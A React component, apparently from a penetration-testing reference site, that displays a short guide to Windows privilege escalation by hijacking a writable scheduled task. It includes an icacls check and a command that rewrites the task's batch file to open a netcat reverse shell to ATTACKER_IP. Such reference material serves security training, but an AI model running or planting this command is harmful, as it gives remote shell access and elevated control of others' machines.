import {
  Typography,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Box,
} from "@mui/material";
import Link from "next/link";
import SyntaxHighlighter from "react-syntax-highlighter";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";

interface IProps {
  title: string;
}

const ScheduledTasks = ({ title }: IProps) => {
  return (
    <>
      {" "}
      <Accordion sx={{ backgroundColor: "primary.main" }}>
        <AccordionSummary
          expandIcon={<ExpandMoreIcon />}
          aria-controls="panel1a-content"
          id="panel1a-header"
        >
          <Typography>{title}</Typography>
        </AccordionSummary>
        <AccordionDetails
          sx={{ backgroundColor: "primary.background_accordian" }}
        >
          <Typography
            sx={{
              color: "primary.main",
            }}
          >
            <Typography variant="h6">Description</Typography>
            <Typography>
              Task Scheduler is a job scheduler in Windows that launches
              computer programs or scripts at pre-defined times or after
              specified time intervals. Looking into scheduled tasks on the
              target system, you may see a scheduled task that either lost its
              binary or it's using a binary you can modify.
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Check Task Permissions</Typography>
            <Typography>
              <SyntaxHighlighter className="syntax" language="powershell">
                {"icacls c:\\tasks\\schtask.bat"}
              </SyntaxHighlighter>
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Exploiting Task</Typography>
            <SyntaxHighlighter className="syntax" language="powershell">
              {
                "echo c:\\tools\\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\\tasks\\schtask.bat"
              }
            </SyntaxHighlighter>
          </Typography>
        </AccordionDetails>
      </Accordion>
    </>
  );
};

export default ScheduledTasks;
